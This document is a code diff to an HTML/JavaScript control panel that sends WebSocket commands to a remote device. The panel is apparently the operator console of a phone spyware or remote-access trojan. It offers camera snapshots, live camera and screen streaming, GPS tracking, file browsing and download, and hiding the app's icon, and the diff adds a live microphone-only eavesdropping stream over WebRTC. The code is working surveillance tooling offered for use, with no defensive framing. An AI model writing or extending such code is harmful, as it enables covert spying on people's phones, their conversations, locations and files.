@@ -436,7 +436,10 @@
             <button class="live-btn" onclick="startLiveStream()">See Live</button>
         </div>
 
-        <button onclick="toggleMic()"><span>🎤</span> <span id="micBtn">Start Mic</span></button>
+        <!-- Live Audio button (NEW) -->
+        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
+        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn">⏹ Stop Live Audio</button>
+
         <button onclick="send('getLocation')"><span>📍</span> GPS Location</button>
     </div>
 
@@ -488,9 +491,14 @@
     let mediaRecorder = null;
     let recordedChunks = [];
 
+    // Live audio state
+    let liveAudioPC = null;
+    let liveAudioStream = null;
+    let audioMediaRecorder = null;
+    let audioRecordedChunks = [];
+
     // Toggle states
     let screenActive = false;
-    let micActive = false;
     let iconHidden = false;
 
     const panel = document.getElementById('main-panel');
@@ -568,16 +576,6 @@
                 document.getElementById('iconBtn').innerText = 'Hide Icon';
                 showNotification('App icon shown');
                 break;
-            case 'AUDIO_RECORDING_STARTED':
-                micActive = true;
-                document.getElementById('micBtn').innerText = 'Stop Mic';
-                showNotification('Mic started');
-                break;
-            case 'AUDIO_RECORDING_STOPPED':
-                micActive = false;
-                document.getElementById('micBtn').innerText = 'Start Mic';
-                showNotification('Mic stopped');
-                break;
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
@@ -596,6 +594,10 @@
             case 'CAMERA_OFFER':
                 console.log('📥 Received CAMERA_OFFER');
                 handleCameraOffer(json);
+                break;
+            case 'AUDIO_OFFER':
+                console.log('📥 Received AUDIO_OFFER');
+                handleAudioOffer(json);
                 break;
             default:
                 console.log('Unhandled JSON type:', json.type);
@@ -642,14 +644,6 @@
             displayCapturedImage(base64);
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
-        } else if (msg.startsWith("AUDIO_STARTED")) {
-            micActive = true;
-            document.getElementById('micBtn').innerText = 'Stop Mic';
-            showNotification('Mic started');
-        } else if (msg.startsWith("AUDIO_STOPPED")) {
-            micActive = false;
-            document.getElementById('micBtn').innerText = 'Start Mic';
-            showNotification('Mic stopped');
         } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
             screenActive = true;
             document.getElementById('screenBtn').innerText = 'Stop Screen';
@@ -739,7 +733,6 @@
     function capturePicture() {
         const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
         const useFlash = document.getElementById('clickFlashCheckbox').checked;
-        // Use correct command name that device expects: CAMERA_SNAPSHOT (uppercase with underscore)
         sendCommand('CAMERA_SNAPSHOT', { camera: camera, flash: useFlash });
     }
 
@@ -753,7 +746,7 @@
         `;
     }
 
-    // ---------- LIVE STREAM ----------
+    // ---------- LIVE STREAM (camera + mic) ----------
     function startLiveStream() {
         const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
         const useFlash = document.getElementById('liveFlashCheckbox').checked;
@@ -788,16 +781,10 @@
             }
         };
         liveCamPC.oniceconnectionstatechange = () => {
-            console.log('ICE connection state:', liveCamPC.iceConnectionState);
+            console.log('Live cam ICE state:', liveCamPC.iceConnectionState);
         };
 
-        const cmd = {
-            type: 'COMMAND',
-            command: 'START_CAMERA_STREAM',
-            requestId: generateRequestId(),
-            params: { camera: camera, flash: useFlash, mic: useMic }
-        };
-        ws.send(JSON.stringify(cmd));
+        sendCommand('START_CAMERA_STREAM', { camera: camera, flash: useFlash, mic: useMic });
     }
 
     function stopLiveStream() {
@@ -810,7 +797,7 @@
             mediaRecorder.stop();
             mediaRecorder = null;
         }
-        ws.send(JSON.stringify({ type: 'COMMAND', command: 'STOP_CAMERA_STREAM', requestId: generateRequestId() }));
+        sendCommand('STOP_CAMERA_STREAM', {});
         panel.innerHTML = 'Ready.';
     }
 
@@ -831,6 +818,75 @@
                 }));
             })
             .catch(e => console.error('Error handling camera offer:', e));
+    }
+
+    // ---------- LIVE AUDIO (mic only) ----------
+    function toggleLiveAudio() {
+        if (liveAudioPC) {
+            stopLiveAudio();
+        } else {
+            startLiveAudio();
+        }
+    }
+
+    function startLiveAudio() {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert('Not connected');
+            return;
+        }
+        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
+        liveAudioPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        liveAudioPC.ontrack = (e) => {
+            liveAudioStream = e.streams[0];
+            document.getElementById('liveAudio').srcObject = liveAudioStream;
+        };
+        liveAudioPC.onicecandidate = (e) => {
+            if (e.candidate) {
+                ws.send(JSON.stringify({
+                    type: 'ICE_CANDIDATE',
+                    candidate: e.candidate.candidate,
+                    sdpMid: e.candidate.sdpMid,
+                    sdpMLineIndex: e.candidate.sdpMLineIndex
+                }));
+            }
+        };
+        liveAudioPC.oniceconnectionstatechange = () => {
+            console.log('Live audio ICE state:', liveAudioPC.iceConnectionState);
+        };
+        sendCommand('START_LIVE_AUDIO', { mic: true });
+        document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
+        document.getElementById('stopLiveAudioBtn').style.display = 'block';
+    }
+
+    function stopLiveAudio() {
+        if (liveAudioPC) {
+            liveAudioPC.close();
+            liveAudioPC = null;
+            liveAudioStream = null;
+        }
+        sendCommand('STOP_LIVE_AUDIO', {});
+        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
+        document.getElementById('stopLiveAudioBtn').style.display = 'none';
+        panel.innerHTML = 'Ready.';
+    }
+
+    function handleAudioOffer(msg) {
+        if (!liveAudioPC) {
+            console.error('No live audio peer connection');
+            return;
+        }
+        const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
+        liveAudioPC.setRemoteDescription(offer)
+            .then(() => liveAudioPC.createAnswer())
+            .then(answer => liveAudioPC.setLocalDescription(answer))
+            .then(() => {
+                ws.send(JSON.stringify({
+                    type: 'ANSWER',
+                    requestId: msg.requestId,
+                    sdp: liveAudioPC.localDescription.sdp
+                }));
+            })
+            .catch(e => console.error('Error handling audio offer:', e));
     }
 
     // Snapshot from live video
@@ -854,7 +910,7 @@
         }, 'image/png');
     }
 
-    // Recording
+    // Recording for live video
     function toggleRecording() {
         if (!liveCamStream) {
             alert('No live stream');
@@ -885,11 +941,6 @@
     function toggleScreen() {
         if (screenActive) send('STOP_SCREEN_SHARE');
         else send('START_SCREEN_SHARE');
-    }
-
-    function toggleMic() {
-        if (micActive) send('stopAudio');
-        else send('startAudio');
     }
 
     function toggleAppIcon() {
@@ -1004,7 +1055,6 @@
 
     // ---------- FILE EXPLORER (two‑pane, with toolbar always visible) ----------
     function renderFiles() {
-        // Always show toolbar
         let html = `
             <div class="file-manager">
                 <div class="file-toolbar-sticky">
@@ -1018,11 +1068,8 @@
         if (!currentData || currentData.length === 0) {
             html += '<p style="padding:20px;">No files found.</p>';
         } else {
-            // Separate folders and files
             const folders = currentData.filter(item => item.isDir);
             const files = currentData.filter(item => !item.isDir);
-
-            // Reset selected files only when there are files
             selectedFiles = [];
 
             html += `
@@ -1073,17 +1120,15 @@
             `;
         }
 
-        html += '</div>'; // close file-manager
+        html += '</div>';
         panel.innerHTML = html;
     }
 
-    // Handle folder click (navigate)
     window.handleFolderClick = function(path) {
         currentPath = path;
         send('ls ' + path);
     };
 
-    // Navigate up
     function navigateUp() {
         if (currentPath === 'root' || currentPath === '') return;
         let parts = currentPath.split('/');
@@ -1094,7 +1139,6 @@
         send('ls ' + parent);
     }
 
-    // Update selected files array
     window.updateSelected = function(checkbox) {
         const path = checkbox.dataset.path;
         if (checkbox.checked) {
@@ -1104,14 +1148,12 @@
         } else {
             selectedFiles = selectedFiles.filter(p => p !== path);
         }
-        // Update the button count
         const downloadBtn = document.querySelector('.download-selected button');
         if (downloadBtn) {
             downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
         }
     };
 
-    // Download selected files
     function downloadSelected() {
         if (selectedFiles.length === 0) {
             alert('No files selected');
